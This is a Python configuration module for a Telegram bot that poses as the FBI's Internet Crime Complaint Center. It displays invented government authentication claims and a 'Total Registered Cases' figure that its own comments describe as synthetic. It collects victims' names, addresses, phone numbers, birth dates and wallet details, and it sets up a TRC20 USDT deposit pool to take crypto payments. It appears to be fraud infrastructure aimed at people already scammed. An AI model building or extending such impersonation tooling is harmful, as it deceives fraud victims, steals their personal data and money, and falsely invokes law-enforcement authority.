"""
FBI IC3 – ADRI Bot
Shared configuration, constants, and utility functions.
"""
import html
import os, re, random, logging
import time
from datetime import datetime, timezone
from dotenv import load_dotenv

load_dotenv()

TOKEN     = os.getenv("BOT_TOKEN", "")
# 无 @ 前缀；用于 Case Overview 折叠在正文内嵌 t.me/?start= 深度链接（点击后 /start 触发同条消息 edit）
BOT_USERNAME = (os.getenv("BOT_USERNAME") or "").strip().lstrip("@")
ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip()]

VALID_PERIOD = "01 JAN 2026 – 31 DEC 2026"
AUTH_ID      = "IC3-2026-REF-9928-X82"
AUTH_REF     = "FBI-2026-HQ-9928-X82"  # 签名证书 Auth Ref
# 首页「Total Registered Cases」为展示用（基数 + 时间有机增量 + DB bump），非真实统计；真实案件数见管理后台「案件统计」或 get_case_count()。
ADRI_DISPLAY_CASES_BASE = int(os.getenv("ADRI_DISPLAY_CASES_BASE", "0"))
# 时间分量：自起点以来按「等效每日」缓增，仅依赖 UTC 时钟，重启后数值连续、可复算
def _default_adri_synthetic_start_unix() -> int:
    return int(datetime(2026, 1, 1, 0, 0, 0, tzinfo=timezone.utc).timestamp())


ADRI_DISPLAY_SYNTHETIC_START_UNIX = int(
    os.getenv("ADRI_DISPLAY_SYNTHETIC_START_UNIX", str(_default_adri_synthetic_start_unix()))
)
ADRI_DISPLAY_SYNTHETIC_PER_DAY = float(os.getenv("ADRI_DISPLAY_SYNTHETIC_PER_DAY", "11.0"))
SIGNATURE_SECRET_KEY = os.getenv("SIGNATURE_SECRET_KEY", "change-me-in-production")
SUBMIT_COOLDOWN_HOURS = 24
# 联络通道：用户或探员任一方发送消息后重置计时；连续无活动达此时长则自动关闭（秒，默认 10 分钟）
LIAISON_IDLE_AUTO_CLOSE_SEC = int(os.getenv("LIAISON_IDLE_AUTO_CLOSE_SEC", "600"))


# Environment validation helper
REQUIRED_ENV_VARS = (
    "BOT_TOKEN",
    "DB_HOST",
    "DB_NAME",
    "DB_USER",
)


def validate_required_env(vars_list: list[str] | None = None) -> tuple[bool, list[str]]:
    """Validate that required environment variables are set (non-empty).

    Returns (ok, messages). Does not exit; caller may decide to abort startup.
    """
    req = list(vars_list) if vars_list is not None else list(REQUIRED_ENV_VARS)
    msgs: list[str] = []
    missing: list[str] = []
    for k in req:
        if not (os.getenv(k) or "").strip():
            missing.append(k)
    if missing:
        msgs.append("Missing required environment variables: " + ", ".join(missing))

    # Helpful warnings
    if (os.getenv("SIGNATURE_SECRET_KEY") or "").startswith("change-me"):
        msgs.append("SIGNATURE_SECRET_KEY is using the default placeholder; change it in production.")

    return (len(missing) == 0, msgs)


def _csv_lower_usernames(raw: str) -> frozenset[str]:
    return frozenset(
        x.strip().lstrip("@").lower()
        for x in raw.split(",")
        if x.strip()
    )


def _csv_int_ids(raw: str) -> frozenset[int]:
    out: list[int] = []
    for x in raw.split(","):
        x = x.strip()
        if x.isdigit():
            out.append(int(x))
    return frozenset(out)


# 联调/测试：同一白名单跳过 24h 提交冷却 + 加密支付人工验证 rate limit。默认含 Adijn8888；生产可设 QA_BYPASS_USERNAMES= 清空。
_QA_BYPASS_USERNAMES = _csv_lower_usernames(os.getenv("QA_BYPASS_USERNAMES", "Adijn8888"))
_QA_BYPASS_USER_IDS = _csv_int_ids(os.getenv("QA_BYPASS_USER_IDS", ""))


def bypass_submit_cooldown(user) -> bool:
    """QA 白名单：不应用 24h 报案提交冷却（与 qa_bypass_rate_limits 同一套名单）。"""
    if user is None:
        return False
    try:
        uid = int(getattr(user, "id", -1))
    except (TypeError, ValueError):
        uid = -1
    if uid >= 0 and uid in _QA_BYPASS_USER_IDS:
        return True
    un = (getattr(user, "username", None) or "").strip().lstrip("@").lower()
    return bool(un and un in _QA_BYPASS_USERNAMES)


def qa_bypass_rate_limits(user) -> bool:
    """与 bypass_submit_cooldown 相同：支付/加密链上人工验证等 rate limit 一并豁免。"""
    return bypass_submit_cooldown(user)


_PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
# 首页横幅图（/start 首条消息）；可用 START_HOME_BANNER_IMAGE 覆盖绝对路径
START_HOME_BANNER_IMAGE = os.getenv(
    "START_HOME_BANNER_IMAGE",
    os.path.join(_PROJECT_ROOT, "ic3shuyen.png"),
)

# ── Session state constants ────────────────────────────
(S_FULLNAME, S_ADDRESS, S_PHONE, S_EMAIL,
 S_TXID, S_ASSET, S_VICTIM_WALLET, S_SUSPECT_WALLET, S_AMOUNT,
 S_PLATFORM, S_SCAMMER_ID,
 S_TIME, S_WALLET, S_CONTACT, S_DOB) = range(15)

# ── Runtime state ─────────────────────────────────────
_last_submission = {}
_session_messages = {}

logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    level=logging.INFO,
    handlers=[
        logging.FileHandler("ic3_audit.log", encoding="utf-8"),
        logging.StreamHandler(),
    ],
)
logger = logging.getLogger(__name__)

# ── Utility functions ──────────────────────────────────
def is_admin(uid): return (not ADMIN_IDS) or (uid in ADMIN_IDS)
def now_str(): return datetime.now().strftime("%Y-%m-%d %H:%M")

def md(text) -> str:
    """Escape Markdown v2 special characters."""
    return re.sub(r"([_*\[\]()~`>#+\-=|{}.!])", r"\\\1", str(text))

def gen_case_id():
    """生成 Case ID，格式：IC3-YYYY-REF-NNNN-XXX（如 IC3-2026-REF-9928-X82）"""
    year = datetime.now().strftime("%Y")
    mid = "".join(str(random.randint(0, 9)) for _ in range(4))
    suffix = "".join(random.choices("ABCDEFGHJKLMNPQRSTUVWXYZ23456789", k=3))
    return f"IC3-{year}-REF-{mid}-{suffix}"


# 首页「Registry ID」行：Telegram 会话 user_data；不参与 PDF/签名（证书仍用 AUTH_ID / AUTH_REF）
ADRI_DISPLAY_REGISTRY_KEY = "adri_display_registry_id"


def get_or_create_display_registry_id(user_data: dict) -> str:
    rid = user_data.get(ADRI_DISPLAY_REGISTRY_KEY)
    if not rid:
        rid = gen_case_id()
        user_data[ADRI_DISPLAY_REGISTRY_KEY] = rid
    return rid


def rotate_display_registry_id(user_data: dict) -> str:
    rid = gen_case_id()
    user_data[ADRI_DISPLAY_REGISTRY_KEY] = rid
    return rid


def clear_display_registry_id(user_data: dict) -> None:
    user_data.pop(ADRI_DISPLAY_REGISTRY_KEY, None)


# ── /start 首页文案（与横幅图 caption 同源；须 ≤1024 字符）────────────────
_HOME_WELCOME_SEP = "────────────────────────────────────"


def _home_welcome_institutional_lines_html(registry_id_line: str) -> list[str]:
    """registry_id_line：首页用会话 Registry；HEADER 等模块传入 AUTH_ID。"""
    sep = _HOME_WELCOME_SEP
    return [
        "<b>AN OFFICIAL INTERFACE OF THE U.S. GOVERNMENT</b>",
        sep,
        html.escape("FEDERAL BUREAU OF INVESTIGATION"),
        html.escape("U.S. DEPARTMENT OF JUSTICE"),
        html.escape("Internet Crime Complaint Center (IC3)"),
        html.escape("Authorized Digital Reporting Interface (ADRI)"),
        sep,
        "<b>SYSTEM AUTHENTICATION</b>",
        html.escape(f"• Registry ID: {registry_id_line}"),
        html.escape("• Node Status: ACTIVE / SECURE"),
        html.escape("• Encryption: AES-256 · FIPS 140-3 COMPLIANT"),
        "",
        "<b>Official Notice:</b>",
        html.escape("This system is authorized to collect digital"),
        html.escape("evidence and formal Internet crime complaints."),
        html.escape("All submissions are subject to monitoring and"),
        html.escape("may be used for investigative and law"),
        html.escape("enforcement purposes."),
    ]


def format_home_welcome_caption_html(total: int, session_registry_id: str) -> str:
    """首页：固定版式 + 会话 Registry ID；Total 随展示计数变化。无斜体说明段。"""
    lines = list(_home_welcome_institutional_lines_html(session_registry_id))
    lines.extend(
        [
            "",
            f"<b>Total Registered Cases:</b> {total}",
            "",
            html.escape("Please select a module to continue."),
        ]
    )
    out = "\n".join(lines)
    if len(out) > 1024:
        logger.warning(
            "home welcome caption length %d exceeds Telegram 1024 limit",
            len(out),
        )
    return out


def detect_wallet(addr):
    if re.match(r"^0x[0-9a-fA-F]{40}$", addr): return "ERC-20/BSC"
    if re.match(r"^T[A-Za-z0-9]{33}$",   addr): return "TRC-20"
    if re.match(r"^(1|3|bc1)[A-Za-z0-9]{25,62}$", addr): return "BTC"
    return "Unknown"

def parse_amount(text):
    m = re.match(r"([\d,.]+)\s*([A-Za-z]+)?", text.strip())
    if m:
        amt = m.group(1).replace(",", "")
        coin = (m.group(2) or "").upper()
        return amt, coin
    return None, None

def track_msg(chat_id, msg_id):
    """记录本次会话发送的消息ID，供提交后批量删除。"""
    _session_messages.setdefault(chat_id, []).append(msg_id)


def _adri_synthetic_time_addon() -> int:
    """
    随 UTC 时间单调递增的展示增量（连续日分数 × 每日等效件数）。
    不读写数据库，仅依赖当前时间与 ADRI_DISPLAY_SYNTHETIC_*；重启后同一时刻结果一致。
    """
    now = int(time.time())
    if now <= ADRI_DISPLAY_SYNTHETIC_START_UNIX:
        return 0
    elapsed = now - ADRI_DISPLAY_SYNTHETIC_START_UNIX
    return int((elapsed / 86400.0) * ADRI_DISPLAY_SYNTHETIC_PER_DAY)


def public_registered_cases_display(bump_total: int) -> int:
    """展示用：基数 + 时间有机增量 + bump_total（/start 与成功建案）；不等同于库内真实案件数。"""
    return (
        ADRI_DISPLAY_CASES_BASE
        + _adri_synthetic_time_addon()
        + max(0, int(bump_total))
    )


# ── Header block（固定 AUTH_ID，供非首页引用）────────────────
HEADER = "\n".join(_home_welcome_institutional_lines_html(AUTH_ID))

# ── 加密支付 / RAD-02 白名单：唯一收款池 ───────────────────────────
# P5/P10/P11/P12/CTS 链上支付轮询、crypto_payment_sessions、RAD-02 白名单与 wallet_risk_whitelist
# 种子均使用 cryptopay_unified_trc20_deposit_pool_list()（同一套地址集合）。
#
# CRYPTOPAY_USDT_CONTRACT = USDT 代币合约（TR7NH...）；可逗号追加收款地址，与 CRYPTOPAY_TRC20_POOL 合并进同一池。
# CRYPTOPAY_TRC20_POOL = 主收款地址列表（逗号分隔），与上面合并去重。
CANONICAL_TRC20_USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"

_INVISIBLE_TRIM = ("\ufeff", "\u200b", "\u200c", "\u200d", "\u2060", "\u00a0")


def sanitize_tron_address_input(addr: str | None) -> str:
    """
    去除 Telegram/剪贴板常见 BOM、零宽字符、不换行空格及首尾引号。
    用于 RAD-02 输入、白名单比对与 CRYPTOPAY_* 解析；对 0x/BTC 地址同样安全（仅去不可见字符）。
    """
    s = (addr or "").strip().strip('"').strip("'")
    for ch in _INVISIBLE_TRIM:
        s = s.replace(ch, "")
    return s.strip()


# 常见手误：在 je 与 K 之间多打一个 k（与官方合约仅差 1 字符）
_KNOWN_USDT_CONTRACT_TYPOS = frozenset(
    {
        "TR7NHqjekKQxGTCi8q8ZY4pL8otSzgjLj6t",
    }
)


def _cryptopay_usdt_contract_tokens() -> list[str]:
    raw = (os.getenv("CRYPTOPAY_USDT_CONTRACT") or "").strip()
    out: list[str] = []
    for p in raw.split(","):
        t = sanitize_tron_address_input(p)
        if t:
            out.append(t)
    return out


def cryptopay_resolved_usdt_contract() -> str:
    """
    供链上监听/转账查询使用的 USDT 合约地址。
    - 仅一个 34 位 T 地址且非官方合约：视为误填收款钱包，回退官方合约。
    - 逗号分隔多段时：第一段为合约，其余为收款地址（与 CRYPTOPAY_TRC20_POOL 并列参与白名单）。
    """
    parts = _cryptopay_usdt_contract_tokens()
    if not parts:
        return CANONICAL_TRC20_USDT_CONTRACT
    first = parts[0]
    if first in _KNOWN_USDT_CONTRACT_TYPOS:
        first = CANONICAL_TRC20_USDT_CONTRACT
    if len(parts) >= 2:
        # 多段：第一段必须是合约；拼写错误已归一化
        if first == CANONICAL_TRC20_USDT_CONTRACT:
            return CANONICAL_TRC20_USDT_CONTRACT
        if first.startswith("T") and len(first) == 34:
            return first
        return CANONICAL_TRC20_USDT_CONTRACT
    # 单段
    if first.startswith("T") and len(first) == 34 and first != CANONICAL_TRC20_USDT_CONTRACT:
        return CANONICAL_TRC20_USDT_CONTRACT
    return first if (first.startswith("T") and len(first) == 34) else CANONICAL_TRC20_USDT_CONTRACT


def _is_valid_tron_wallet_token(addr: str) -> bool:
    a = sanitize_tron_address_input(addr)
    if not a.startswith("T") or len(a) != 34:
        return False
    if a == CANONICAL_TRC20_USDT_CONTRACT or a in _KNOWN_USDT_CONTRACT_TYPOS:
        return False
    return True


def cryptopay_unified_trc20_deposit_pool_list() -> list[str]:
    """
    全站唯一 TRC20 收款地址池（有序、去重）：
    先 CRYPTOPAY_TRC20_POOL，再追加 CRYPTOPAY_USDT_CONTRACT 中多段时的后续段 / 单段误填钱包。
    """
    seen: set[str] = set()
    ordered: list[str] = []

    def add(addr: str) -> None:
        a = sanitize_tron_address_input(addr)
        if not _is_valid_tron_wallet_token(a) or a in seen:
            return
        seen.add(a)
        ordered.append(a)

    pool_raw = (os.getenv("CRYPTOPAY_TRC20_POOL") or "").strip()
    for p in pool_raw.split(","):
        add(p)
    parts = _cryptopay_usdt_contract_tokens()
    if not parts:
        return ordered
    if len(parts) == 1:
        add(parts[0])
        return ordered
    for p in parts[1:]:
        add(p)
    return ordered


def cryptopay_tron_safe_address_candidates() -> set[str]:
    """RAD-02 白名单与 post_init DB 种子：与加密支付轮询同一地址集合。"""
    return set(cryptopay_unified_trc20_deposit_pool_list())
